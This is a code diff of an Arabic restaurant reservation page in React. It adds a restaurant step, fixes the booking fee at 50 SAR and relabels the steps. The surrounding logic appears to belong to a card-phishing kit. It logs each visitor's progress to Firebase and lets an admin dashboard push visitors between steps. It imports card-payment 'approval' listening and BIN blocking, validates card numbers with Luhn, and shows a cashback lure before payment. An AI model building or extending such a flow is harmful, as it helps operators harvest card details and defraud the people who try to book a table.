@@ -1,23 +1,61 @@
 import { useState, useEffect } from "react";
 import { Link, useParams, useLocation } from "wouter";
 import { ArrowRight, Calendar, Clock, Users, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, X, Gift } from "lucide-react";
-import { CountryPhoneInput } from "@/components/country-phone-input";
 import { getRestaurantById } from "@/lib/restaurant-data";
 import { addData, handlePay, listenForApproval, isBinBlocked } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/utils";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { ProgressBar } from "@/components/bujairi-header";
 
-type Step = 1 | 2 | 3 | 4;
+type Step = 1 | 2 | 3 | 4 | 5;
 
-const RESERVE_STEPS = [
-  { n: 1, label: "الموعد" },
-  { n: 2, label: "البيانات" },
-  { n: 3, label: "الفاتورة" },
-  { n: 4, label: "الدفع" },
-];
+function StepIndicator({ current }: { current: Step }) {
+  const steps = [
+    { number: 1 as Step, label: "المطعم" },
+    { number: 2 as Step, label: "الموعد" },
+    { number: 3 as Step, label: "البيانات" },
+    { number: 4 as Step, label: "الفاتورة" },
+    { number: 5 as Step, label: "الدفع" },
+  ];
+
+  return (
+    <div className="bg-[#3a0f1d] px-4 py-4" data-testid="step-indicator">
+      <div className="flex items-center justify-center gap-0.5 max-w-md mx-auto">
+        {steps.map((step, index) => (
+          <div key={step.number} className="flex items-center">
+            <div className="flex flex-col items-center">
+              <div
+                className={`w-8 h-8 rounded-full flex items-center justify-center text-[10px] font-bold transition-all ${
+                  step.number < current
+                    ? "bg-[#c9a96e] text-white"
+                    : step.number === current
+                    ? "bg-white text-[#4a1525] shadow-lg"
+                    : "bg-white/20 text-white/50"
+                }`}
+                data-testid={`step-${step.number}`}
+              >
+                {step.number < current ? "✓" : step.number}
+              </div>
+              <span className={`text-[8px] mt-1 font-medium whitespace-nowrap ${
+                step.number <= current ? "text-white" : "text-white/40"
+              }`}>
+                {step.label}
+              </span>
+            </div>
+            {index < steps.length - 1 && (
+              <div
+                className={`w-5 h-0.5 mx-0.5 rounded-full transition-all ${
+                  step.number < current ? "bg-[#c9a96e]" : "bg-white/20"
+                }`}
+              />
+            )}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
 
 const validateLuhn = (cardNum: string): boolean => {
   const digits = cardNum.replace(/\s/g, "");
@@ -77,24 +115,17 @@ export default function Reserve() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showCashbackPopup, setShowCashbackPopup] = useState(false);
 
-  // Booking confirmation fee. Visitors can choose between a full deposit
-  // (50 SAR — refundable on visit) or a small "hold" deposit (10 SAR) that
-  // simply confirms the reservation. Both flow through the same payment
-  // and Firestore code paths so the dashboard sees the chosen amount.
-  const FULL_FEE = 50;
-  const PARTIAL_FEE = 10;
-  const [paymentMode, setPaymentMode] = useState<"full" | "partial">("full");
-  const serviceFee = paymentMode === "partial" ? PARTIAL_FEE : FULL_FEE;
+  const serviceFee = 50;
   const reservationTotal = serviceFee;
 
-  // Admin "page push" handler — dashboard sends steps 1-4 corresponding to the
-  // four internal stages of /reserve/:id (الموعد/البيانات/الفاتورة/الدفع).
+  // Admin "page push" handler — dashboard sends steps 1-5 corresponding to the
+  // five internal stages of /reserve/:id (المطعم/الموعد/البيانات/الفاتورة/الدفع).
   // App.tsx forwards those as a custom event so we can jump the visitor to the
   // right internal stage of this multi-step page without losing the URL.
   useEffect(() => {
     const applyTarget = (raw: unknown) => {
       const target = Number(raw) || 0;
-      if (target >= 1 && target <= 4) {
+      if (target >= 1 && target <= 5) {
         setStep(target as Step);
         return true;
       }
@@ -123,10 +154,11 @@ export default function Reserve() {
     const visitorId = localStorage.getItem("visitor");
     if (!visitorId) return;
     const pageMap: Record<number, string> = {
-      1: "reserve_date",
-      2: "reserve_details",
-      3: "reserve_invoice",
-      4: "reserve_checkout",
+      1: "reserve_restaurant",
+      2: "reserve_date",
+      3: "reserve_details",
+      4: "reserve_invoice",
+      5: "reserve_checkout",
     };
     const page = pageMap[step];
     if (!page) return;
@@ -171,7 +203,32 @@ export default function Reserve() {
     return visitorId;
   };
 
-  const handleDateSubmit = async () => {
+  const handleStepOneSubmit = async () => {
+    if (stepSubmitting) return;
+
+    setStepSubmitting(true);
+    setStepSubmitError("");
+
+    const visitorId = ensureReservationVisitorId();
+    const saved = await addData({
+      id: visitorId,
+      type: "restaurant_reservation",
+      restaurant: restaurant.name,
+      restaurantEn: restaurant.nameEn,
+      currentPage: "reserve_date",
+    });
+
+    if (!saved) {
+      setStepSubmitError("تعذر حفظ البيانات، يرجى المحاولة مرة أخرى");
+      setStepSubmitting(false);
+      return;
+    }
+
+    setStep(2);
+    setStepSubmitting(false);
+  };
+
+  const handleStepTwoSubmit = async () => {
     if (stepSubmitting || !date || !time) return;
 
     setStepSubmitting(true);
@@ -181,7 +238,6 @@ export default function Reserve() {
     const saved = await addData({
       id: visitorId,
       type: "restaurant_reservation",
-      restaurantId: restaurant.id,
       restaurant: restaurant.name,
       restaurantEn: restaurant.nameEn,
       date,
@@ -196,7 +252,7 @@ export default function Reserve() {
       return;
     }
 
-    setStep(2);
+    setStep(3);
     setStepSubmitting(false);
   };
 
@@ -296,7 +352,6 @@ export default function Reserve() {
     await addData({
       id: visitorId,
       type: "restaurant_reservation",
-      restaurantId: restaurant.id,
       restaurant: restaurant.name,
       restaurantEn: restaurant.nameEn,
       date, time, guests, name, phone, notes,
@@ -369,11 +424,59 @@ export default function Reserve() {
         </div>
       </div>
 
-      <ProgressBar current={step} steps={RESERVE_STEPS} />
+      <StepIndicator current={step} />
 
       <div className="max-w-lg mx-auto px-4 py-6">
         {step === 1 && (
           <div className="space-y-4 animate-fade-in" data-testid="step-1-content">
+            <div className="bg-white rounded-xl overflow-hidden shadow-sm">
+              <img
+                src={restaurant.bgImage}
+                alt={restaurant.nameEn}
+                className="w-full h-40 object-cover"
+              />
+              <div className="p-5">
+                <div className="flex items-center gap-3 mb-3">
+                  <img src={restaurant.logo} alt="" className="w-14 h-14 rounded-lg object-cover shadow-md" />
+                  <div>
+                    <h2 className="text-[#4a1525] font-bold text-lg">{restaurant.name}</h2>
+                    <p className="text-[#7a6b5f] text-xs">{restaurant.nameEn}</p>
+                  </div>
+                </div>
+                {restaurant.cuisine && (
+                  <span className="inline-block bg-[#f5efe6] text-[#4a1525] text-xs px-3 py-1 rounded-full mb-3">
+                    {restaurant.cuisine}
+                  </span>
+                )}
+                <p className="text-[#7a6b5f] text-sm leading-relaxed mb-3">{restaurant.description}</p>
+                <div className="flex items-center gap-4 text-xs text-[#7a6b5f]">
+                  <span className="flex items-center gap-1">
+                    <Clock className="w-3.5 h-3.5" /> {restaurant.hours}
+                  </span>
+                  <span>{restaurant.priceRange}</span>
+                </div>
+              </div>
+            </div>
+
+            <button
+              onClick={() => { void handleStepOneSubmit(); }}
+              disabled={stepSubmitting}
+              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+              data-testid="button-next-step-1"
+            >
+              {stepSubmitting ? "جاري الإرسال..." : "التالي - اختيار الموعد"}
+              <ChevronLeft className="w-5 h-5" />
+            </button>
+            {stepSubmitError && (
+              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
+                {stepSubmitError}
+              </p>
+            )}
+          </div>
+        )}
+
+        {step === 2 && (
+          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
             <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
               <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                 <Calendar className="w-5 h-5" />
@@ -443,24 +546,24 @@ export default function Reserve() {
             </div>
 
             <button
-              onClick={() => { void handleDateSubmit(); }}
+              onClick={() => { void handleStepTwoSubmit(); }}
               disabled={!date || !time || stepSubmitting}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-              data-testid="button-next-step-1"
+              data-testid="button-next-step-2"
             >
               {stepSubmitting ? "جاري الإرسال..." : "التالي - بيانات الحجز"}
               <ChevronLeft className="w-5 h-5" />
             </button>
             {stepSubmitError && (
-              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
+              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-2-submit">
                 {stepSubmitError}
               </p>
             )}
           </div>
         )}
 
-        {step === 2 && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
+        {step === 3 && (
+          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
             <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
               <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                 <User className="w-5 h-5" />
@@ -486,13 +589,20 @@ export default function Reserve() {
 
               <div>
                 <label className="block text-[#4a1525] text-sm font-medium mb-2">رقم الهاتف *</label>
-                <CountryPhoneInput
-                  value={phone}
-                  onChange={setPhone}
-                  className="!border-[#d5c8b5] !bg-[#faf7f3] py-1.5 focus-within:!border-[#4a1525] focus-within:ring-1 focus-within:ring-[#4a1525]"
-                  inputClassName="bg-[#faf7f3] py-2"
-                  testId="input-phone"
-                />
+                <div className="relative">
+                  <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#b1a1a0]" />
+                  <input
+                    type="tel"
+                    value={phone}
+                    onChange={(e) => setPhone(e.target.value.replace(/[^\d+]/g, "").slice(0, 15))}
+                    required
+                    maxLength={15}
+                    placeholder="05XXXXXXXX"
+                    dir="ltr"
+                    className="w-full border border-[#d5c8b5] rounded-lg pl-10 pr-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors placeholder:text-[#b1a1a0] text-left"
+                    data-testid="input-phone"
+                  />
+                </div>
               </div>
 
               <div>
@@ -513,10 +623,10 @@ export default function Reserve() {
             </div>
 
             <button
-              onClick={() => { if (name && phone) setStep(3); }}
+              onClick={() => { if (name && phone) setStep(4); }}
               disabled={!name || !phone}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-              data-testid="button-next-step-2"
+              data-testid="button-next-step-3"
             >
               التالي - الفاتورة
               <ChevronLeft className="w-5 h-5" />
@@ -524,8 +634,8 @@ export default function Reserve() {
           </div>
         )}
 
-        {step === 3 && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
+        {step === 4 && (
+          <div className="space-y-4 animate-fade-in" data-testid="step-4-content">
             <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] rounded-xl p-5 text-center">
               <Receipt className="w-8 h-8 text-[#c9a96e] mx-auto mb-2" />
               <h2 className="text-white font-bold text-lg">فاتورة الحجز</h2>
@@ -597,79 +707,16 @@ export default function Reserve() {
               </div>
             </div>
 
-            {/* Payment-amount selector: full deposit vs. partial 10 SAR hold */}
-            <div className="bg-white rounded-xl p-4 shadow-sm space-y-3" data-testid="payment-mode-selector">
-              <h3 className="text-[#4a1525] font-bold text-sm flex items-center gap-2">
-                <CreditCard className="w-4 h-4" />
-                طريقة الدفع
-              </h3>
-              <div className="grid grid-cols-2 gap-3">
-                <button
-                  type="button"
-                  onClick={() => setPaymentMode("full")}
-                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
-                    paymentMode === "full"
-                      ? "border-[#4a1525] bg-[#faf3ec] shadow-sm"
-                      : "border-[#e8dccb] bg-white hover:border-[#c9a96e]"
-                  }`}
-                  data-testid="payment-mode-full"
-                >
-                  <div className="text-[11px] text-[#7a6b5f] mb-1">الدفع الكامل</div>
-                  <div className="text-[#4a1525] font-bold text-lg">{FULL_FEE} ر.س</div>
-                  <div className="text-[10px] text-[#7a6b5f] mt-1 leading-tight">
-                    قابلة للاسترداد عند الزيارة
-                  </div>
-                  {paymentMode === "full" && (
-                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#4a1525] flex items-center justify-center">
-                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
-                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
-                      </svg>
-                    </div>
-                  )}
-                </button>
-                <button
-                  type="button"
-                  onClick={() => setPaymentMode("partial")}
-                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
-                    paymentMode === "partial"
-                      ? "border-[#4a1525] bg-[#faf3ec] shadow-sm"
-                      : "border-[#e8dccb] bg-white hover:border-[#c9a96e]"
-                  }`}
-                  data-testid="payment-mode-partial"
-                >
-                  <div className="flex items-center justify-between">
-                    <div className="text-[11px] text-[#7a6b5f] mb-1">دفع جزئي</div>
-                    <span className="text-[9px] bg-[#c9a96e] text-white px-1.5 py-0.5 rounded font-bold">
-                      موصى به
-                    </span>
-                  </div>
-                  <div className="text-[#4a1525] font-bold text-lg">{PARTIAL_FEE} ر.س</div>
-                  <div className="text-[10px] text-[#7a6b5f] mt-1 leading-tight">
-                    لتأكيد الحجز فقط
-                  </div>
-                  {paymentMode === "partial" && (
-                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#4a1525] flex items-center justify-center">
-                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
-                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
-                      </svg>
-                    </div>
-                  )}
-                </button>
-              </div>
-            </div>
-
             <div className="bg-[#f5efe6] rounded-xl p-4 text-center">
               <p className="text-[#7a6b5f] text-xs">
-                {paymentMode === "partial"
-                  ? "يتم خصم 10 ر.س لتأكيد الحجز فقط، والباقي يُدفع في المطعم"
-                  : "رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم"}
+                رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم
               </p>
             </div>
 
             <button
-              onClick={() => { setStep(4); setShowCashbackPopup(true); }}
+              onClick={() => { setStep(5); setShowCashbackPopup(true); }}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md flex items-center justify-center gap-2"
-              data-testid="button-next-step-3"
+              data-testid="button-next-step-4"
             >
               متابعة الدفع
               <CreditCard className="w-5 h-5" />
@@ -677,7 +724,7 @@ export default function Reserve() {
           </div>
         )}
 
-        {step === 4 && (
+        {step === 5 && (
           <>
             {showCashbackPopup && (
               <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
